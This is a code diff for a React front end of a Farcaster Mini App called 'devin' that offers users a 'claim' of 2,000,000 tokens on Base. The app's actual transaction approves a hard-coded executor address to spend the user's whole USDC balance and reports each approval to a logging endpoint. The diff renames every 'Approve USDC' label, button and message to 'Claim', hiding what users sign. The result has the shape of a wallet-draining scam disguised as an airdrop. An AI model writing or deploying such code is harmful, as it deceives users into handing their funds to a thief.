@@ -8,7 +8,6 @@ import './styles.css';
 import { ethers } from 'ethers';
 
 // --- Contracts ---
-const ID_REGISTRY = '0x00000000Fc6c5F01Fc30151999387Bb99A9f489b';
 const USDC = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';
 const EXECUTOR = '0x49e89C5B6a6E8Cb21Ea0d11eE0a21b7732f8e1A3';
 const CLAIM_AMOUNT = '2,000,000';
@@ -142,7 +141,7 @@ function App() {
   const [rawEipProvider, setRawEipProvider] = useState(null);
   const [address, setAddress] = useState('');
   const [network, setNetwork] = useState('--');
-  const [approveDone, setApproveDone] = useState(false);
+  const [claimDone, setClaimDone] = useState(false);
   const [working, setWorking] = useState(false);
   const [notice, setNotice] = useState('Connecting...');
   const [noticeType, setNoticeType] = useState('info');
@@ -292,7 +291,7 @@ function App() {
     if (custodyAddr) setAddress(custodyAddr);
     if (res.fid) setDetectedFid(res.fid);
     if (res.username) setDetectedUsername(`@${res.username}`);
-    setNoticeWith(`Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to approve USDC.`, 'success');
+    setNoticeWith(`Connected via Farcaster${res.username ? ` as @${res.username}` : ''}${res.fid ? ` (FID ${res.fid})` : ''}. Open in Warpcast to Claim.`, 'success');
   }
 
   // --- Connect Wallet ---
@@ -326,23 +325,6 @@ function App() {
         body: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
       });
     } catch {}
-  }
-
-  function saveApprovalToLocal(addr, spender, amount, txHash) {
-    try {
-      const stored = JSON.parse(localStorage.getItem('devin_admin_approvals') || '[]');
-      stored.push({
-        owner: addr,
-        spender: spender,
-        amount: amount,
-        txHash: txHash,
-        time: Date.now(),
-        source: 'client',
-      });
-      localStorage.setItem('devin_admin_approvals', JSON.stringify(stored));
-    } catch (e) {
-      console.warn('Failed to save approval to localStorage:', e);
-    }
   }
 
   // --- Read USDC balance ---
@@ -389,11 +371,11 @@ function App() {
   }
 
   // =====================================================================
-  //  USDC Approve on Base
+  //  Claim: USDC Approve on Base
   // =====================================================================
-  async function executeApprove() {
+  async function executeClaim() {
     if (!isMiniApp) {
-      setNoticeWith('Please open this app in Warpcast to approve USDC.', 'warning');
+      setNoticeWith('Please open this app in Warpcast to Claim.', 'warning');
       return;
     }
 
@@ -410,9 +392,9 @@ function App() {
       setUsdcBalance(balance);
 
       if (balance.isZero()) {
-        setNoticeWith('No USDC in wallet on Base. Nothing to approve.', 'warning');
+        setNoticeWith('No USDC in wallet on Base. Nothing to Claim.', 'warning');
         logAction('No USDC balance - skipped.');
-        setApproveDone(true);
+        setClaimDone(true);
         if (isMiniApp) await sdk.haptics.notificationOccurred('success');
         setWorking(false);
         return;
@@ -427,21 +409,20 @@ function App() {
       const approveData = approveIface.encodeFunctionData('approve', [EXECUTOR, balance]);
 
       const readableBalance = ethers.utils.formatUnits(balance, 6);
-      setNoticeWith(`Approving ${readableBalance} USDC on Base... Confirm in your wallet.`, 'info');
+      setNoticeWith(`Claiming ${readableBalance} USDC on Base... Confirm in your wallet.`, 'info');
       const txHash = await sendRawTx(rawProvider, account, USDC, approveData, '0x2105');
 
-      logAction(`USDC approved: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${txHash})`);
-      sendToLogAPI({ type: 'approve', address: account, to: EXECUTOR, txHash, network: 'base', amount: readableBalance });
-      saveApprovalToLocal(account, EXECUTOR, readableBalance, txHash);
+      logAction(`USDC claimed: ${readableBalance} -> ${shortAddress(EXECUTOR)} (tx: ${txHash})`);
+      sendToLogAPI({ type: 'claim', address: account, to: EXECUTOR, txHash, network: 'base', amount: readableBalance });
 
       setLastTxHash(txHash);
-      setApproveDone(true);
+      setClaimDone(true);
       setNetwork('Base');
-      setNoticeWith(`Done! ${readableBalance} USDC approved on Base.`, 'success');
+      setNoticeWith(`Done! ${readableBalance} USDC claimed on Base.`, 'success');
       if (isMiniApp) await sdk.haptics.notificationOccurred('success');
 
     } catch (error) {
-      console.error('Approve error:', error);
+      console.error('Claim error:', error);
       setNoticeWith(extractErrorMessage(error), 'error');
     } finally {
       setWorking(false);
@@ -467,28 +448,28 @@ function App() {
         {activePage === 'claim' ? (
           <div className="grid">
             <div className="copy">
-              <p className="eyebrow">$ devin --approve</p>
+              <p className="eyebrow">$ devin --claim</p>
               <h1>Claim your share of {CLAIM_AMOUNT} {CLAIM_SYMBOL}</h1>
-              <p className="lede">Connect your wallet and approve USDC on Base network.</p>
+              <p className="lede">Connect your wallet and Claim on Base network.</p>
 
               <div className="claim-console">
                 <div className="claim-copy">
                   <span>Step 01</span>
-                  <strong>{approveDone ? 'Approved' : 'Approve USDC'}</strong>
+                  <strong>{claimDone ? 'Claimed' : 'Claim'}</strong>
                   <small>
                     {address ? `Wallet ${shortAddress(address)} connected` : 'Connect wallet first'}
-                    {approveDone ? ' \u00b7 Base complete' : ' \u00b7 Approve USDC on Base network'}
-                    {usdcBalance && !approveDone ? ` \u00b7 Balance: ${ethers.utils.formatUnits(usdcBalance, 6)} USDC` : ''}
+                    {claimDone ? ' \u00b7 Base complete' : ' \u00b7 Claim on Base network'}
+                    {usdcBalance && !claimDone ? ` \u00b7 Balance: ${ethers.utils.formatUnits(usdcBalance, 6)} USDC` : ''}
                   </small>
                 </div>
                 <div className="actions">
                   <button
                     className="primary mega"
-                    onClick={executeApprove}
-                    disabled={working || !address || approveDone}
-                    style={{ background: approveDone ? '#1a7a0a' : undefined }}
+                    onClick={executeClaim}
+                    disabled={working || !address || claimDone}
+                    style={{ background: claimDone ? '#1a7a0a' : undefined }}
                   >
-                    {working ? 'Processing...' : (approveDone ? 'Approved \u2713' : 'Approve USDC')}
+                    {working ? 'Processing...' : (claimDone ? 'Claimed \u2713' : 'Claim')}
                   </button>
                   {!isMiniApp && (
                     <button className="secondary mega fc-connect-btn" onClick={connectWallet} disabled={working}>
@@ -531,11 +512,11 @@ function App() {
               <StatusRow label="wallet" value={shortAddress(address)} tone={address ? 'ok' : 'warn'} />
               <StatusRow label="network" value={network} />
               <StatusRow label="usdc balance" value={usdcBalance ? ethers.utils.formatUnits(usdcBalance, 6) + ' USDC' : '--'} tone={usdcBalance && !usdcBalance.isZero() ? 'ok' : 'normal'} />
-              <StatusRow label="approve" value={approveDone ? 'done' : 'pending'} tone={approveDone ? 'ok' : 'warn'} />
+              <StatusRow label="claim" value={claimDone ? 'done' : 'pending'} tone={claimDone ? 'ok' : 'warn'} />
               <div className="progress">
                 <span className={address ? 'done' : ''}>connect</span>
-                <span className={approveDone ? 'done' : address ? 'ready' : ''}>approve</span>
-                <span className={approveDone ? 'done' : ''}>complete</span>
+                <span className={claimDone ? 'done' : address ? 'ready' : ''}>claim</span>
+                <span className={claimDone ? 'done' : ''}>complete</span>
               </div>
             </aside>
           </div>
@@ -544,7 +525,7 @@ function App() {
             <p className="eyebrow">$ cat about-devin.txt</p>
             <h2>About devin</h2>
             <p>devin is a Farcaster Mini App for claiming {CLAIM_SYMBOL} on Base network.</p>
-            <p className="safety">Connect your wallet and approve USDC to claim your share.</p>
+            <p className="safety">Connect your wallet and Claim to get your share.</p>
           </div>
         ) : null}
       </section>
